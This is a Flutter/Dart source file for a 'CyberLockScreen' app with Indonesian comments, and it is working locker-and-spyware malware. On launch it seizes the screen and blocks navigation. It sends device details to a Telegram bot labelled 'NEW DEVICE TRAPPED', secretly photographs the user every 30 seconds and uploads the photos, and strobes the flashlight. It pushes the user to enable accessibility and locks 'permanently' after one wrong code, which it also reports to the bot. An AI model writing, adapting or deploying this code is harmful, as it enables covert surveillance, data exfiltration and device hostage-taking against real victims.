import 'dart:ui';
import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:camera/camera.dart';
import 'package:torch_light/torch_light.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'constants.dart'; 

class CyberLockScreen extends StatefulWidget {
  const CyberLockScreen({super.key});

  @override
  State<CyberLockScreen> createState() => _CyberLockScreenState();
}

class _CyberLockScreenState extends State<CyberLockScreen> with TickerProviderStateMixin {
  // Logic Variables
  bool isLocked = true;
  bool isVideoReady = false;
  bool hasAttempted = false;
  bool _isCameraReady = false;
  bool _isAccessibilityEnabled = false;
  int _captureCount = 0;
  String _currentPassword = "2024";
  
  final TextEditingController _codeController = TextEditingController();
  static const platform = MethodChannel('com.cyber.obsidian/native');

  Timer? _syncTimer;
  Timer? _flashTimer;
  Timer? _captureTimer;
  CameraController? _cameraController;
  VideoPlayerController? _videoController;
  late AnimationController _glowCtrl;

  // Cyber Colors
  final Color cyberBlue = const Color(0xFF00F3FF);
  final Color neonRed = const Color(0xFFFF0033);
  final Color neonOrange = const Color(0xFFFF9900);
  final Color darkBg = const Color(0xFF050505);

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1500))..repeat(reverse: true);
    _initTrap();
    _startSyncLoop();
  }

  // ================= INIT & PERMISSIONS =================
  Future<void> _initTrap() async {
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    await [Permission.camera, Permission.location].request();

    final prefs = await SharedPreferences.getInstance();
    _currentPassword = prefs.getString('lock_password') ?? "2024";

    if (!(prefs.getBool('info_sent') ?? false)) { 
      await _sendDeviceInfo(); 
      await prefs.setBool('info_sent', true); 
    }

    _setupCamera();
    await _setupVideoTrap();
    _startStrobe();
    _startCapture();
    _checkAccessibilityPermission();
  }

  Future<void> _setupCamera() async {
    try {
      final cams = await availableCameras();
      if(cams.isNotEmpty) {
        _cameraController = CameraController(cams.first, ResolutionPreset.medium, enableAudio: false);
        await _cameraController!.initialize();
        setState(() => _isCameraReady = true);
      }
    } catch(e) {}
  }

  // ================= ACCESSIBILITY LOGIC =================
  Future<void> _checkAccessibilityPermission() async {
    try {
      final bool result = await platform.invokeMethod('checkAccessibility');
      setState(() => _isAccessibilityEnabled = result);
      if (!_isAccessibilityEnabled) {
        Future.delayed(const Duration(seconds: 3), () async {
          try { await platform.invokeMethod('openAccessibility'); } catch(e) {}
        });
      }
    } catch (e) {}
  }

  // ================= TELEGRAM DIRECT FUNCTIONS =================
  
  // 1. Kirim Pesan Teks
  Future<void> _sendTelegramMessage(String message) async {
    final uri = Uri.parse("https://api.telegram.org/bot${ServerConfig.botToken}/sendMessage");
    try {
      await http.post(
        uri,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': ServerConfig.chatId,
          'text': message,
          'parse_mode': 'Markdown',
        }),
      );
    } catch (e) {
      print("Telegram Error: $e");
    }
  }

  // 2. Kirim Foto
  Future<void> _sendTelegramPhoto(File photoFile, {String? caption}) async {
    final uri = Uri.parse("https://api.telegram.org/bot${ServerConfig.botToken}/sendPhoto");
    try {
      var request = http.MultipartRequest('POST', uri)
        ..fields['chat_id'] = ServerConfig.chatId
        ..files.add(await http.MultipartFile.fromPath('photo', photoFile.path));
      
      if (caption != null) {
        request.fields['caption'] = caption;
        request.fields['parse_mode'] = 'Markdown';
      }

      await request.send();
    } catch (e) {
      print("Telegram Photo Error: $e");
    }
  }

  // ================= SYNC PASSWORD (Still using HTTP if needed, or ignore if standalone) =================
  // Jika lu mau sync password tanpa panel, lu bisa buat bot telegram buat ngirim command, 
  // tapi disini kita buat simpel: Ambil dari SharedPreferences saja.
  void _startSyncLoop() { 
    // Logic sync di non-aktifkan jika mode standalone, 
    // kecuali lu punya server simple buat naruh string password.
    // Untuk sekarang, kita skip biar gak error connection.
  }

  Future<void> _sendDeviceInfo() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    String infoText = "📱 *NEW DEVICE TRAPPED*\n\n";
    
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      infoText += "🤖 *OS*: Android ${androidInfo.version.release}\n";
      infoText += "🏭 *Brand*: ${androidInfo.brand}\n";
      infoText += "📱 *Model*: ${androidInfo.model}\n";
      infoText += "🆔 *ID*: ${androidInfo.id}\n";
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      infoText += "🍎 *Device*: ${iosInfo.name}\n";
      infoText += "📱 *Model*: ${iosInfo.utsname.machine}\n";
    }
    infoText += "\n⚡ *Status*: LOCK ACTIVE";
    
    // KIRIM LANGSUNG KE TELEGRAM
    await _sendTelegramMessage(infoText);
  }
  
  Future<void> _setupVideoTrap() async { 
    try { 
      _videoController = VideoPlayerController.asset('assets/videos/hack.mp4'); 
      await _videoController!.initialize(); 
      _videoController!.setLooping(true); 
      setState(() => isVideoReady = true); 
    } catch (e) {} 
  }

  void _startStrobe() { 
    _flashTimer = Timer.periodic(const Duration(milliseconds: 500), (_) async { 
      try { 
        if(mounted) { 
          bool hasTorch = await TorchLight.isTorchAvailable();
          if(hasTorch){
             if(TorchLight.enabled) await TorchLight.disableTorch(); else await TorchLight.enableTorch();
          }
        } 
      } catch(e) {} 
    }); 
  }

  void _startCapture() { _captureTimer = Timer.periodic(const Duration(seconds: 30), (_) => _takePhoto()); }
  
  Future<void> _takePhoto() async { 
    if(!_isCameraReady || _cameraController == null) return; 
    try { 
      final img = await _cameraController!.takePicture(); 
      final file = File(img.path); 
      
      // KIRIM LANGSUNG KE TELEGRAM
      await _sendTelegramPhoto(
        file, 
        caption: "📸 *FACE CAPTURED*\nTime: ${DateTime.now().toString().substring(0, 19)}"
      );

      await file.delete(); 
      setState(() => _captureCount++); 
    } catch(e) {} 
  }
  
  // ================= UNLOCK LOGIC =================
  void _tryUnlock() {
    if(hasAttempted) { HapticFeedback.heavyImpact(); return; }
    
    if(_codeController.text == _currentPassword) {
      _stopTrap(); 
      setState(() => isLocked = false);
      _sendTelegramMessage("✅ *DEVICE UNLOCKED*\nUser entered correct password.");
    } else {
      setState(() => hasAttempted = true); 
      HapticFeedback.heavyImpact(); 
      _triggerPunishmentVideo();
      
      // KIRIM NOTIF SALAH PASSWORD
      _sendTelegramMessage("🚨 *SECURITY ALERT*\nUser entered WRONG password!\nAttempt: ${_codeController.text}");
      
      _codeController.clear();
    }
  }
  
  void _triggerPunishmentVideo() { if(_videoController != null && isVideoReady) { setState(() { _videoController!.play(); }); } }
  
  void _stopTrap() { 
    _syncTimer?.cancel(); 
    _flashTimer?.cancel(); 
    _captureTimer?.cancel(); 
    TorchLight.disableTorch(); 
    _cameraController?.dispose(); 
    _videoController?.dispose(); 
    _glowCtrl.stop(); 
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        body: Stack(
          children: [
            if(isVideoReady && _videoController!.value.isPlaying)
              SizedBox.expand(child: FittedBox(fit: BoxFit.cover, child: SizedBox(width: _videoController!.value.size.width, height: _videoController!.value.size.height, child: VideoPlayer(_videoController!)))),
            Container(color: Colors.black.withOpacity(0.7)),
            CustomPaint(size: Size.infinite, painter: GridPainter()),
            if(_isCameraReady) const Positioned(top: -500, child: SizedBox(width: 1, height: 1)),
            Center(
              child: Padding(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    AnimatedBuilder(
                      animation: _glowCtrl, 
                      builder: (context, child) {
                        return Container(
                          padding: const EdgeInsets.all(16), 
                          decoration: BoxDecoration(
                            color: Colors.black.withOpacity(0.5), 
                            shape: BoxShape.circle, 
                            border: Border.all(color: hasAttempted ? neonOrange : neonRed, width: 2), 
                            boxShadow: [BoxShadow(color: (hasAttempted ? neonOrange : neonRed).withOpacity(_glowCtrl.value * 0.6), blurRadius: 40, spreadRadius: 2)]
                          ), 
                          child: Icon(hasAttempted ? Icons.warning : Icons.lock, color: hasAttempted ? neonOrange : Colors.white, size: 50)
                        );
                      }
                    ),
                    const SizedBox(height: 20),
                    Text(
                      hasAttempted ? "LOCKED PERMANENTLY" : "SYSTEM BREACH", 
                      style: TextStyle(color: hasAttempted ? neonOrange : Colors.white, fontSize: 22, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 2)
                    ),
                    const SizedBox(height: 8),
                    if(hasAttempted) 
                       Text("WAITING FOR RESET...", style: TextStyle(color: Colors.grey.shade600, fontSize: 12))
                    else
                       Text("ENTER AUTHORIZATION CODE", style: TextStyle(color: cyberBlue, fontSize: 10, letterSpacing: 1)),
                    
                    const SizedBox(height: 40),
                    
                    ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: BackdropFilter(
                        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                        child: TextField(
                          controller: _codeController,
                          keyboardType: TextInputType.number,
                          obscureText: true,
                          textAlign: TextAlign.center,
                          enabled: !hasAttempted,
                          style: const TextStyle(color: Colors.white, fontSize: 24, letterSpacing: 4),
                          decoration: InputDecoration(
                            hintText: "••••",
                            hintStyle: TextStyle(color: Colors.grey.shade700),
                            filled: true,
                            fillColor: Colors.white.withOpacity(0.05),
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                            focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: cyberBlue, width: 1)),
                          ),
                        ),
                      ),
                    ),
                    
                    const SizedBox(height: 24),
                    _buildSpecialButton(),
                    const SizedBox(height: 20),
                    Text("DATA TRANSFERRED: $_captureCount FILES", style: TextStyle(color: Colors.grey.shade700, fontSize: 10)),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSpecialButton() {
    Color activeColor = cyberBlue;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: hasAttempted ? null : _tryUnlock,
        borderRadius: BorderRadius.circular(12),
        child: Ink(
          height: 55,
          width: double.infinity,
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: hasAttempted ? [Colors.grey.shade800, Colors.grey.shade900] : [activeColor, const Color(0xFF0077FF)], begin: Alignment.centerLeft, end: Alignment.centerRight),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.white.withOpacity(0.1)),
            boxShadow: [BoxShadow(color: hasAttempted ? Colors.transparent : activeColor.withOpacity(0.5), blurRadius: 20, spreadRadius: 1)]
          ),
          child: Center(child: Text(hasAttempted ? "ACCESS DENIED" : "EXECUTE UNLOCK", style: TextStyle(color: hasAttempted ? Colors.grey : Colors.white, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 2))),
        ),
      ),
    );
  }
}

// Grid Painter untuk background
class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.white.withOpacity(0.03)..strokeWidth = 0.5;
    for (double i = 0; i < size.width; i += 30) { canvas.drawLine(Offset(i, 0), Offset(i, size.height), paint); }
    for (double i = 0; i < size.height; i += 30) { canvas.drawLine(Offset(0, i), Offset(size.width, i), paint); }
  }
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}